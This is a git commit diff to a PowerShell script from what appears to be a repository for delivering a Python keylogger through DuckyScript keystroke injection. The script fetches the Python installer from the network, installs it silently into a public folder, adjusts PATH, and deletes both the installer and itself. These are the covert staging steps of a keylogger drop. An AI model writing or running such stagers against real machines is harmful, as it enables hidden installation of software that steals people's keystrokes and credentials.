30c7fbf4e81718509a09ae9b93201d1b4501d31b
csandoval63 <csandoval63@student.rcc.edu>
2020-05-14 17:23:55 -0700

    Update install_python.ps1

--- Python keylogger stuff with DUCKYscript/install_python.ps1
+++ Python keylogger stuff with DUCKYscript/install_python.ps1
@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "C:\Users\Public\python-3.8.0.exe"
-.\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
+C:\Users\Public\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 Remove-Item C:\Users\Public\python-3.8.0.exe
 Remove-Item .\install_python.ps1
